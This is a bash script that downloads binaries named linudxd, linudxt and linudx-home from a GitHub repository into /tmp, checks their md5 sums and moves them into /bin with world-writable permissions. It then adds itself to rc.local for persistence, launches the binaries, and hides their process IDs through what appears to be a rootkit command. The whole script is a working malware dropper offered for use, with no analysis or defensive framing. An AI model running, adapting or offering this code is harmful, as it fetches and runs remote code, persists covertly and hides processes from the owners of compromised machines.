#!/bin/bash
#
#down and checkmd5
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/linudxd
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/linudxt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/linudx-home
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/linudx-ver.txt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/linudx-update.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/linudx-startup.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5

check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/linudxt | cut -d " " -f1\``
check2=`cat /tmp/mymd5 | grep \`md5sum /tmp/linudxd | cut -d " " -f1\``
check3=`cat /tmp/mymd5 | grep \`md5sum /tmp/linudx-home | cut -d " " -f1\``
check4=`cat /tmp/mymd5 | grep \`md5sum /tmp/linudx-ver.txt | cut -d " " -f1\``


rm -rf /tmp/mymd5

if [[ "$check1" = "" || "$check2" = "" || "$check3" = "" || "$check4" = "" ]]
then
  echo "check1"
  echo $check1
  echo "check2"
  echo $check2
  echo "check3"
  echo $check3
  echo "check4"
  echo $check4
  echo "down error!"
  exit 2
fi

#uninstall start
sed -i '\/bin\/linudx-startup.sh/d' /etc/rc.d/rc.local

kill -9 `cat /bin/linudxd-pid`
kill -9 `cat /bin/linudxt-pid`
kill -9 `cat /bin/linudx-home-pid`

rm -rf /bin/linudxd
rm -rf /bin/linudxt
rm -rf /bin/linudx-home
rm -rf /bin/linudx-update.sh
rm -rf /bin/linudx-ver.txt
rm -rf /bin/linudx-startup.sh
#uninstall finish


#copy files to /bin
mv /tmp/linudxd /bin/linudxd
mv /tmp/linudxt /bin/linudxt
mv /tmp/linudx-home /bin/linudx-home
mv /tmp/linudx-update.sh /bin/linudx-update.sh
mv /tmp/linudx-startup.sh /bin/linudx-startup.sh
mv /tmp/linudx-ver.txt /bin/linudx-ver.txt


#add autorun for centos

echo '/bin/linudx-startup.sh'>>/etc/rc.d/rc.local


chmod 777 /bin/linudxd
chmod 777 /bin/linudxt
chmod 777 /bin/linudx-home
chmod 777 /bin/linudx-update.sh
chmod 777 /bin/linudx-startup.sh


/bin/linudxd &
echo `pidof linudxd`>/bin/linudxd-pid
/bin/linudxt &
echo `pidof linudxt`>/bin/linudxt-pid
/bin/linudx-home &
echo `pidof linudx-home`>/bin/linudx-home-pid

#hide pid and files
/linudx/linudx_cmd hide `cat /bin/linudxd-pid`
/linudx/linudx_cmd hide `cat /bin/linudxt-pid`
/linudx/linudx_cmd hide `cat /bin/linudx-home-pid`

if [ `pidof linudxd` ];then
  /linudx/linudx_cmd hide   
else
  echo "hide success one"
fi

if [ `pidof linudxd` ];then
  echo "hide failed"
else
  echo "hide sucess two" 
fi
